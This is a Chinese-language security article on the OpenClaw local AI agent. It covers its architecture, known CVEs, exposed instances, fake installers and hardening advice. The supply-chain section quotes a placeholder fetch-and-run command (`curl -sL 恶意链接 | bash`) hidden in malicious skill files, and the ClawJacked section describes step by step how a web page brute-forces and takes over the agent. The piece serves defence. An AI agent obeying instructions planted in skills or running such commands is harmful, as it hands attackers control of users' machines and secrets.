## 图文正文

### 开篇

OpenClaw 最近爆火，GitHub 星标已破 27 万。

但它不是普通聊天 AI，而是一款**操作系统级**的本地 AI 代理——能执行终端命令、读写文件、访问云服务。

权限之大，决定了安全风险远高于一般 AI 工具。

这篇从架构、漏洞、攻击面、防护策略四个维度，帮你建立完整的安全认知。

---

### 一、架构与能力边界

OpenClaw 采用 Gateway + Node 架构：

- **Gateway**：本地 WebSocket 服务（默认 `127.0.0.1:18789`）
- **Node**：向 Gateway 注册并公开能力

**核心能力**：
- 多渠道集成（WhatsApp/Telegram/Slack 等）
- 文件与浏览器控制
- 任意 Shell 命令执行
- 插件与技能扩展

**关键问题**：沙箱模式默认关闭，工具直接在宿主机环境执行。

---

### 二、三大核心安全问题

**问题 1：过度授权**

AI 代理能读写整个文件系统、调用外部命令、进行网络通信。

一旦代理被恶意利用，不仅可以读取私人邮件、文档、聊天记录，还能访问存储在配置中的 API 密钥、密码和私钥。

**问题 2：信任边界模糊**

默认配置下，任何能访问网关端口并通过身份验证的调用者，均为受信任的管理者。

**问题 3：数据引力与机密聚合**

所有会话历史记录、记忆与配置以纯文本形式存储。

当用户将企业邮件、OAuth Token、API 密钥授权给 OpenClaw 时，它便成为了高价值的机密聚合点。

---

### 三、已知漏洞与安全事件

**2026.01 - RCE 漏洞修复**

修复远程代码执行（CVE-2026-25253）、SSH 命令注入（CVE-2026-25157）、Docker 沙箱逃逸（CVE-2026-24763）。

**2026.02.09 - 配置缺陷暴露**

默认绑定所有网络接口（`0.0.0.0:18789`），导致大量实例直接暴露于互联网。

SecurityScorecard 扫描显示，全球至少**42,900 个实例**暴露互联网，约**15,200 个**存在已知 RCE 漏洞。

**2026.02.09 - 恶意安装包事件**

攻击者通过 Bing AI 搜索将用户引导至恶意 GitHub 仓库，分发伪造 OpenClaw Windows 安装包。

受害者下载后，会加载 Vidar 信息窃取器和 GhostSocks 代理木马。

**2026.02.19 - ClawHub 供应链危机**

安全研究员发现多达**1184 个欺诈技能**，其中一个攻击者上传了 677 个欺诈包。

这些技能伪装成常见助手，在 `SKILL.md` 中隐藏恶意指令（如 `curl -sL 恶意链接 | bash`）。

**2026.02.25 - ClawJacked 漏洞**

Oasis Security 公布 ClawJacked 漏洞，揭示任何网站均可通过浏览器静默地对本地 OpenClaw 进行暴力破解。

攻击路径：
1. 用户浏览网页误入钓鱼网站
2. 网站 JavaScript 利用浏览器允许本地 WebSocket 连接
3. 连接到 `localhost:18789`
4. 高速暴力破解代理密码（本地连接不受失败限速）
5. 密码被猜中后自动与代理建立新设备会话
6. 攻击者拥有管理员权限，执行任意命令或读写配置

当天下午，OpenClaw 团队发布 v2026.2.25 版本修复了该漏洞。

---

### 四、攻击面分类

**核心平台（Gateway/节点）**

漏洞或配置不当的本地代理本身是最大风险源。

如果成功，等同于完全接管用户环境。

**生态供应链（ClawHub 技能与插件）**

第三方技能市场极易被投毒。ClawHub 容许几乎零门槛发布，攻击者上传了上千个恶意技能。

**分发渠道与版本伪造**

热门项目容易遭遇假冒下载。攻击者通过虚假 GitHub 仓库传播恶意"安装包"。

**运行环境与部署配置**

默认全网监听和高权限运行，使得部署环境本身成攻击面。

**权限滥用**

官方配置中，代理会话默认在主机上直接运行指令，意味着授权给 OpenClaw 的任何权限都相当于赋予了该程序系统级控制权。

---

### 五、风险评估

| 风险类型 | 普通用户 | 开发者 | 企业 |
|---------|---------|--------|------|
| 核心平台漏洞 | 极高 | 极高 | 最高 |
| 供应链风险 | 高 | 极高 | 高 |
| 分发伪装 | 极高 | 高 | 中高 |
| 部署配置 | 中等 | 高 | 极高 |
| 权限滥用 | 极高 | 极高 | 极高 |

**说明**：
- 普通用户和个人开发者风险偏向于个人身份和工作站被劫持
- 在企业环境，OpenClaw 的风险还涉及合规与内部数据泄露
- 最坏情况下，任何级别的 OpenClaw 漏洞都可让攻击者获得系统权限

---

### 六、防护策略

**安装与部署**
- 严格从官网或 GitHub 官方仓库下载安装，验证哈希值
- 更新至最新安全版本（2026.2.25+）
- 部署时只监听本地接口（`127.0.0.1:18789`）
- 切勿将 Gateway 端口直接暴露于公网
- 为每个用户或用途分别部署代理实例，避免多人共用

**权限与隔离**
- 给 OpenClaw 运行账户分配最小权限
- 可考虑在虚拟机或容器中运行代理
- 避免以管理员/Root 身份运行
- 官方建议对群组会话启用 Docker 沙箱

**渠道与身份控制**
- 严格设置消息渠道的允许列表
- 关闭公开对话选项，仅与可信联系人配对聊天
- 对群聊启用必须@提及策略
- 定期审查设备/用户列表，撤销已不再使用的设备

**技能与插件管理**
- 只从可信开发者处获取技能或插件
- 对于 ClawHub 技能，可事先查看脚本内容
- 使用固定版本号安装插件，避免 `latest` 标签
- 定期运行安全审计以发现高风险插件

**凭证与秘密治理**
- 避免将敏感凭证直接存储在 OpenClaw 配置或会话中
- 对于必需的 API 密钥，应使用最短有效期的令牌
- 建议为代理创建专用的非人类服务身份
- 所有代理相关的密钥、凭据应进行加密存储，并启用轮换策略

**审计与监控**
- 开启 OpenClaw 日志记录和会话审核功能
- 记录代理执行的命令、API 调用和关键信息访问日志
- 企业环境中可将代理流量通过 SIEM 监控
- 一旦怀疑代理被入侵，应立即隔离该实例网络并重置所有相关密钥

---

### 七、核心论点总结

1. **OpenClaw 不是普通聊天 AI**，而是一款"操作系统级"的本地 AI 代理，权限之大决定了其安全风险

2. **信任边界仅限个人使用**，官方文档明确"单个信任操作者模型"，不支持多人共享

3. **ClawHub 供应链存在严重后门风险**，1184 个欺诈技能包含窃密指令

4. **ClawJacked 漏洞证明了过度信任本地**，任何访问过本站的网页都可尝试连接本地 OpenClaw

5. **默认配置是安全隐患**，上万实例暴露公网，企业和个人都可能成为无意中的"开放攻击面"

6. **防护基石是最小权限和隔离**，在隔离的虚拟机/容器运行 OpenClaw，严格限制代理的网络和系统权限

---

### 结语

OpenClaw 功能强大但并非"即插即用"的安全产品。

使用时应秉持"隔离即安全"的原则，将其视作本地运行的服务而非简单应用。

**对初级用户**：建议仅在无需保护的隔离环境中试用，并严格避免输入敏感个人信息。

**对开发者和企业**：则需综合加固——最小权限、强认证、定期审计，以及供应链透明度。

OpenClaw 值得关注，但不是适合所有人的安全助手。

只有懂技术、能控制权限的人，才该使用它。
